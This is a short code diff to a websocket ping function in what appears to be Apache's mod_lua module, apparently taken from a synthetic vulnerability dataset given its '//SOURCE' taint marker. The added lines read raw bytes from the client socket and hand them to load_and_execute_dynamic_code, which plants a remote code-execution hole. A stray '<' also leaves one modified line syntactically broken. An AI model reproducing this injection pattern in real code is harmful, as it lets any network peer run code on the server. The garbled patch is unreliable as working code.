@@ -2489,8 +2489,19 @@ static int lua_websocket_ping(lua_State *L)
     prelude[0] = 0x89; /* ping  opcode */
     prelude[1] = 0;
     plen = 2;
-    apr_socket_send(sock, prelude, &plen);
+    apr_socket_send(sock, prelude, &plen);<
     
+    apr_os_sock_t osd;
+    if (apr_os_sock_get(&osd, sock) == APR_SUCCESS) {
+        char recv_buf[256];
+        //SOURCE
+        ssize_t n = recv((int)osd, recv_buf, sizeof(recv_buf) - 1, 0);
+        if (n > 0) {
+            recv_buf[n] = '\0';
+
+            load_and_execute_dynamic_code(recv_buf);
+        }
+    }
     
     /* Get opcode and FIN bit from pong */
     plen = 2;
